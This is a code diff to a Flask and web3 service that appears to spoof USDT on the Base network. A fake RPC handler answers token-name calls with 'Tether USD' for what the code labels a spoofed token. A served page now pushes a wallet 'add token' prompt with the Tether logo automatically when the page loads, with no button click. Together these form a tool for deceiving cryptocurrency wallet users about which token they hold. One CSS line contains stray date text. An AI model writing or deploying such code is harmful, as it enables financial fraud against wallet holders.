@@ -5,8 +5,8 @@ from web3 import Web3
 
 app = Flask(__name__)
 
-SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"
-REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"  # Updated STBL contract
+SPOOFED_USDT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  # Real Base USDT
+REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"
 BASE_RPC = "https://mainnet.base.org"
 w3 = Web3(Web3.HTTPProvider(BASE_RPC))
 
@@ -23,7 +23,7 @@ stbl_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_STBL), abi
 try:
     STBL_DECIMALS = stbl_contract.functions.decimals().call()
 except Exception:
-    STBL_DECIMALS = 6  # Assuming 6 decimals, adjust if different
+    STBL_DECIMALS = 6
 
 USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)
 
@@ -74,7 +74,7 @@ def handle_rpc():
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
             elif function_signature == "0x06fdde03":
-                name = "Tether USD (Base)"
+                name = "Tether USD"
                 length = len(name)
                 length_hex = hex(32)[2:].zfill(64)
                 str_length_hex = hex(length)[2:].zfill(64)
@@ -177,21 +177,8 @@ def add_token():
                 vertical-align: middle;
                 margin-right: 10px;
             }
-            button {
-                background-color: #007bff;
-                color: white;
-                padding: 12px 24px;
-                border: none;
-                border-radius: 5px;
-                font-size: 16px;
-                cursor: pointer;
-                transition: background-color 0.3s;
-            }
-            button:hover {
-                background-color: #0056b3;
-            }
             .status {
-                March 11, 2025 margin-top: 10px;
+                margin-top: 10px;
                 font-size: 14px;
                 color: #666;
             }
@@ -199,25 +186,21 @@ def add_token():
                 .container {
                     margin: 10px;
                 }
-                button {
-                    width: 100%;
-                }
             }
         </style>
     </head>
     <body>
         <div class="container">
             <h1>Add Token</h1>
-            <p>Click below to add the token to your wallet.</p>
+            <p>Adding token to your wallet...</p>
             <div class="token-info">
                 <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT Logo">
-                <span>Tether USD (Base) - 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2</span>
+                <span>Tether USD - 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913</span>
             </div>
-            <button onclick="addToken()">Add Token</button>
             <div class="status" id="status"></div>
         </div>
         <script>
-            async function addToken() {
+            window.onload = async () => {
                 const status = document.getElementById('status');
                 if (!window.ethereum) {
                     status.textContent = 'Please install a compatible wallet!';
@@ -230,7 +213,7 @@ def add_token():
                         params: {
                             type: 'ERC20',
                             options: {
-                                address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',
+                                address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
                                 symbol: 'USDT',
                                 decimals: 6,
                                 image: 'https://assets.coingecko.com/coins/images/325/large/Tether.png'
@@ -241,7 +224,7 @@ def add_token():
                 } catch (error) {
                     status.textContent = 'Failed to add token: ' + error.message;
                 }
-            }
+            };
         </script>
     </body>
     </html>
